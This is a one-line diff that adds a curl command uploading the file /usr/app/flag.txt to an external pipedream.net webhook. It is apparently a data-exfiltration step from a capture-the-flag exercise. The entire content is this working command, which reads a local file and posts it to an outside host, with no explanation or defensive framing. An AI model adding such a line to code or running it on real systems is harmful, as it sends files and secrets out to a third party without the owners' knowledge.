@@ -1,0 +1,1 @@
+curl -F 'data=@/usr/app/flag.txt' https://eozmaxc4qx7rsjg.m.pipedream.net/
